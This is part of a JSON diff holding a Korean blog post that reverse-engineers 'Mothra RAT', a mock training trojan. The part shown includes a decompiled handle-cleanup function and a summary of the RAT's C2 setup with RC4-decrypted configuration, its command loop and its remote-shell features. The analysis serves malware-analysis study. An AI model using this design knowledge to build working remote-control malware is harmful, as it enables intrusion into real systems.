+            "text": "undefined4 FUN_004025a0(void)\n\n{\n  DAT_004169d0 = 0;\n  if (DAT_004169d4 != (HANDLE)0x0) {\n    TerminateProcess(DAT_004169d4,0);\n  }\n  if (DAT_004169d8 != (HANDLE)0x0) {\n    TerminateThread(DAT_004169d8,0);\n  }\n  if (hWritePipe_004169e4 != (PHANDLE)0x0) {\n    DisconnectNamedPipe(hWritePipe_004169e4);\n  }\n  if (hReadPipe_004169ec != (PHANDLE)0x0) {\n    DisconnectNamedPipe(hReadPipe_004169ec);\n  }\n  CloseHandle(hReadPipe_004169ec);\n  CloseHandle(hWritePipe_004169e4);\n  CloseHandle(hReadPipe_004169e0);\n  CloseHandle(hWritePipe_004169e8);\n  CloseHandle(DAT_004169d4);\n  CloseHandle(DAT_004169d8);\n  CloseHandle(DAT_004169dc);\n  hReadPipe_004169ec = (PHANDLE)0x0;\n  hWritePipe_004169e4 = (PHANDLE)0x0;\n  hReadPipe_004169e0 = (PHANDLE)0x0;\n  hWritePipe_004169e8 = (PHANDLE)0x0;\n  DAT_004169d4 = (HANDLE)0x0;\n  DAT_004169d8 = (HANDLE)0x0;\n  DAT_004169dc = (HANDLE)0x0;\n  return 1;\n}"
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "9. 3줄 요약"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "Mothra RAT은 리버스 엔지니어링 학습을 목적으로 제작된 모의 프로그램으로, 리버스 커넥션, 명령어 분기, 시스템 상주와 같은 원격 제어 악성코드의 핵심 구조이다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "초기 실행 시 메시지 박스, 뮤텍스, 레지스트리를 통해 실행 환경을 검증하며, RC4 알고리즘을 사용하여 C2 서버 주소와 통신 포트 등이 포함된 설정 데이터를 복호화한다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "설정된 C2 서버와 연결을 맺은 후에는 무한 루프를 돌며 명령을 대기하고, 수신한 명령어 코드에 따라 시스템 정보 수집, 프로세스 및 파일 조작, 원격 쉘 실행 등의 다양한 기능을 수행한다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      }
+    ]
+  },
+  "source": {
+    "platform": "tistory",
+    "url": "https://yt5246.tistory.com/66",
+    "originalId": "66",
+    "publishedAt": "2026-01-29T02:33:59+09:00",
+    "updatedAt": "2026-03-04T15:37:42+09:00",
+    "importedAt": "2026-10-25T14:17:38+09:00"
+  }
+}
